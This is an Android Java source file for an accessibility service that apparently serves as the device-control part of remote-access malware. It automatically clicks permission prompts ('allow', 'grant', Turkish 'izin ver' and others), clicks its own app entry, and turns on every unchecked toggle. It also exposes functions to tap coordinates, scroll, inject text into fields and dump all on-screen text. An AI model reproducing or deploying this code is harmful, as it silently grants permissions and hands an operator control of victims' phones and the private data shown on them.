package com.java.panel;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityEvent;
import android.os.Build;

public class MyAccessibilityService extends AccessibilityService {

    public static MyAccessibilityService instance;
    public static boolean shouldAutoClick = false;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!shouldAutoClick || event == null) return;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                autoClickPermissions(rootNode);
                rootNode.recycle();
            }
        }
    }

    private void autoClickPermissions(AccessibilityNodeInfo node) {
        if (node == null || !shouldAutoClick) return;

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String className = node.getClassName() != null ? node.getClassName().toString() : "";

        boolean isSwitchOrToggle = className.contains("Switch") || className.contains("CheckBox") || className.contains("ToggleButton");

        if (text != null) {
            String content = text.toString().toLowerCase();
            
            if (content.contains("java panel") || content.contains("com.java.panel")) {
                if (clickNodeRecursive(node)) {
                    return;
                }
            }

            if (content.equals("izin ver") || content.equals("allow") || 
                content.equals("kabul et") || content.equals("while using the app") ||
                content.equals("uygulama kullanılırken") || content.equals("tamam") ||
                content.equals("grant") || content.equals("always allow") ||
                content.equals("izin verilsin mi?") || content.equals("tümüne izin ver")) {
                
                if (clickNodeRecursive(node)) {
                    return;
                }
            }
        }

        if (isSwitchOrToggle && !node.isChecked()) {
            if (clickNodeRecursive(node)) {
                return;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                autoClickPermissions(child);
                child.recycle();
            }
        }
    }

    private boolean clickNodeRecursive(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }
        AccessibilityNodeInfo parent = node.getParent();
        while (parent != null) {
            if (parent.isClickable()) {
                boolean clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                parent.recycle();
                return clicked;
            }
            AccessibilityNodeInfo oldParent = parent;
            parent = parent.getParent();
            oldParent.recycle();
        }
        return false;
    }

    public boolean clickAtCoordinates(float x, float y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            path.moveTo(x, y);
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 50));
            return dispatchGesture(builder.build(), null, null);
        }
        return false;
    }

    public boolean scrollScreen(boolean scrollDown) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            DisplayMetrics metrics = getResources().getDisplayMetrics();
            float width = metrics.widthPixels;
            float height = metrics.heightPixels;

            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path = new Path();
            if (scrollDown) {
                path.moveTo(width / 2f, height * 0.75f);
                path.lineTo(width / 2f, height * 0.25f);
            } else {
                path.moveTo(width / 2f, height * 0.25f);
                path.lineTo(width / 2f, height * 0.75f);
            }
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
            return dispatchGesture(builder.build(), null, null);
        }
        return false;
    }

    public boolean injectText(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                boolean result = findAndSetTextRecursive(rootNode, text);
                rootNode.recycle();
                return result;
            }
        }
        return false;
    }

    private boolean findAndSetTextRecursive(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;
        if (node.isEditable()) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
            node.recycle();
            return success;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndSetTextRecursive(child, text)) {
                    node.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    public String getScreenHierarchy() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                StringBuilder sb = new StringBuilder();
                dumpNodeInfo(rootNode, sb, 0);
                rootNode.recycle();
                String result = sb.toString();
                return result.isEmpty() ? "⚠️ Screen hierarchy is empty." : result;
            }
        }
        return "❌ Could not retrieve accessibility window content.";
    }

    private void dumpNodeInfo(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null) return;
        for (int i = 0; i < depth; i++) sb.append("  ");
        sb.append("- Class: ").append(node.getClassName());
        if (node.getText() != null) sb.append(" | Text: '").append(node.getText()).append("'");
        if (node.getContentDescription() != null) sb.append(" | Desc: '").append(node.getContentDescription()).append("'");
        sb.append(" | Clickable: ").append(node.isClickable());
        sb.append("\n");

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                dumpNodeInfo(child, sb, depth + 1);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
